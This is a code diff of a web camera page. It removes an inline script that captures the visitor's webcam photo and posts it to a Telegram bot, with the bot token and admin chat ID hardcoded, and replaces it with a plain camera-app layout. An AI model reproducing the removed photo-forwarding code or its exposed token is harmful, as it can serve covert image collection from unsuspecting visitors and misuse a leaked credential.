@@ -2,86 +2,73 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Web Camera App</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    video, canvas {
-      max-width: 100%;
-      border: 1px solid #ccc;
-      margin: 10px 0;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:disabled {
-      background-color: #cccccc;
-    }
-  </style>
+  <title>Camera Demo</title>
+  <link rel="stylesheet" href="/assets/styles/main.css">
 </head>
 <body>
-  <h1>Take a Photo</h1>
-  <video id="video" autoplay></video>
-  <button id="capture">Capture Photo</button>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <div class="camera-ctn">
+    <canvas id="canvas"> </canvas>
+    <div class="camera-view">
+      <video id="camera-stream" autoplay loop muted>
+        <source src="" >
+      </video>
+    </div>
+    <div class="camera-bottom">
+      <div class="inner">
+        <div class="lens-modifier">
+          <button>
+            .5
+          </button>
+          <button class="active">
+            1x
+          </button>
+          <button>
+            3
+          </button>
+        </div>
+        <div class="modes">
+          <button>
+            SINGLE TAKE
+          </button>
+          <button class="active">
+            PHOTO
+          </button>
+          <button>
+            VIDEO
+          </button>
+          <button>
+            PORTRAIT
+          </button>
+        </div>
+        <div class="shutter-ctn">
+          <button id="photos-btn" class="previous-shots">
+          </button>
+          <button id="shutter" class="shutter">
+          </button>
+          <button class="switch-device">
+            Sw
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureButton = document.getElementById('capture');
+  <div class="gallery-view">
+    <button id="prev">
+      PREV
+    </button>
+    <img data-index="0" src="" alt="current viewed img">
+    <button id="next">
+      NEXT
+    </button>
+    <button id="close-gallery">
+      GO BACK
+    </button>
+  </div>
 
-    const BOT_TOKEN = "7893827213:AAE9htRgc66S1dVuC0n2uVEL4il7vaa0nXE"; // Replace with your bot token
-    const ADMIN_CHAT_ID = "5503099846"; // Replace with your admin chat ID
-
-    // Access the user's camera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
-        video.srcObject = stream;
-      })
-      .catch((err) => {
-        console.error("Error accessing the camera: ", err);
-        alert("Failed to access the camera. Please allow camera permissions.");
-      });
-
-    // Capture photo and send to Telegram Bot
-    captureButton.addEventListener('click', () => {
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Convert canvas to blob
-      canvas.toBlob((blob) => {
-        const formData = new FormData();
-        formData.append('chat_id', ADMIN_CHAT_ID);
-        formData.append('photo', blob, 'photo.jpg');
-
-        // Send the photo to Telegram Bot API
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData,
-        })
-          .then((response) => {
-            if (response.ok) {
-              alert("Photo sent to the admin successfully!");
-            } else {
-              alert("Failed to send photo to the admin.");
-            }
-          })
-          .catch((err) => {
-            console.error("Error sending photo: ", err);
-          });
-      });
-    });
-  </script>
+  <!-- JAVASCRIPT LINK -->
+  <script src="/app.js"></script>
 </body>
 </html>
